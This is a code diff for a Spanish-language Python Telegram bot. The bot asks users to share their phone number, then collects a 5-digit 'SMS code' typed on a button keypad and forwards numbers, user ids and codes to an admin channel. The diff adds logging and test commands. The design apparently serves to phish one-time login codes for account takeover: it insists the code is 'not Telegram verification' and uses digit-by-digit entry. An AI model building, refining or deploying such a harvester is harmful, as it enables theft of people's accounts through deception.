@@ -10,18 +10,16 @@ from telegram.ext import (
     CallbackQueryHandler, ContextTypes, filters
 )
 
-# ========= Config =========
-BOT_TOKEN = os.getenv("BOT_TOKEN")  # token de @BotFather
-ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "0"))  # p.ej. -1002756519910
+# === Variables de entorno ===
+BOT_TOKEN = os.getenv("BOT_TOKEN")                         # Token de @BotFather
+ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # ID de tu canal/grupo como cadena
 
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s %(levelname)s %(name)s: %(message)s"
-)
+# === Log ===
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
 log = logging.getLogger("sms-verify-bot")
 
 UD_PHONE = "phone"
-UD_CODE = "code"   # buffer de los dígitos que el usuario va marcando
+UD_CODE  = "code"
 
 def share_phone_kb():
     btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
@@ -52,44 +50,39 @@ def build_keypad(code_str: str):
     )
     return text, InlineKeyboardMarkup(rows)
 
-# ===== Handlers =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_CODE] = ""
     context.user_data.pop(UD_PHONE, None)
     await update.message.reply_text(
-        "Hola 👋\nPara continuar, comparte tu número con el botón de abajo.\n\n"
+        "Hola 👋\n"
+        "Para continuar, comparte tu número con el botón de abajo.\n\n"
         "🔎 *Importante*: esto **NO** es verificación de Telegram. "
         "Es un código propio que te enviaremos por *SMS*.",
-        reply_markup=share_phone_kb(),
-        parse_mode="Markdown"
+        reply_markup=share_phone_kb(), parse_mode="Markdown"
     )
 
 async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.contact:
         return
-
     phone = update.message.contact.phone_number
     context.user_data[UD_PHONE] = phone
     context.user_data[UD_CODE] = ""
 
     user = update.effective_user
     stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     admin_text = (
         "📥 *Nuevo número recibido*\n"
         f"- Teléfono: `{phone}`\n"
         f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
         f"- Fecha/Hora: {stamp}"
     )
-
-    # Enviar al grupo/canal interno
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
+            log.info("Enviado número a destino %s", ADMIN_CHANNEL_ID)
     except Exception as e:
-        log.error("Error enviando a ADMIN_CHANNEL_ID: %s", e)
+        log.exception("Error enviando número al destino: %s", e)
 
-    # Mandar inmediatamente el teclado numérico
     await update.message.reply_text(
         "✅ Número recibido correctamente.\n\n"
         "Ahora introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.",
@@ -100,13 +93,9 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
-    if not q:
-        return
     await q.answer()
-
     code = context.user_data.get(UD_CODE, "")
     data = q.data or ""
-
     if data.startswith("d:"):
         if len(code) < 5:
             code += data.split(":")[1]
@@ -114,7 +103,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         code = code[:-1]
     elif data == "cancel":
         context.user_data[UD_CODE] = ""
-        await q.edit_message_text("Operación cancelada. Si deseas reintentarlo, escribe /start.")
+        await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
         return
     elif data == "ok":
         phone = context.user_data.get(UD_PHONE, "desconocido")
@@ -130,13 +119,12 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             if ADMIN_CHANNEL_ID:
                 await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
+                log.info("Enviado código a destino %s", ADMIN_CHANNEL_ID)
         except Exception as e:
-            log.error("Error enviando código a ADMIN_CHANNEL_ID: %s", e)
-
+            log.exception("Error enviando código al destino: %s", e)
         await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
         context.user_data[UD_CODE] = ""
         return
-
     context.user_data[UD_CODE] = code
     text, kb = build_keypad(code)
     try:
@@ -144,26 +132,35 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await q.message.edit_reply_markup(reply_markup=kb)
 
-async def echo_re_show(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Si escribe algo después de compartir el número, re-mostramos la botonera."""
-    if context.user_data.get(UD_PHONE):
-        text, kb = build_keypad(context.user_data.get(UD_CODE, ""))
-        await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")
-    else:
-        await update.message.reply_text(
-            "Primero comparte tu número con el botón de abajo.",
-            reply_markup=share_phone_kb()
-        )
+async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")
+
+async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
+        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Falló el envío: {e}")
+        log.exception("Testsend falló: %s", e)
+
+async def on_startup(app):
+    if ADMIN_CHANNEL_ID:
+        try:
+            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
+            log.info("Mensaje de arranque enviado a %s", ADMIN_CHANNEL_ID)
+        except Exception as e:
+            log.exception("No pude enviar mensaje de arranque: %s", e)
 
 def main():
     if not BOT_TOKEN:
         raise RuntimeError("Falta BOT_TOKEN")
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, on_contact))
     app.add_handler(CallbackQueryHandler(keypad_cb))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo_re_show))
+    app.add_handler(CommandHandler("id", id_cmd))
+    app.add_handler(CommandHandler("testsend", testsend_cmd))
 
     app.run_polling()
 
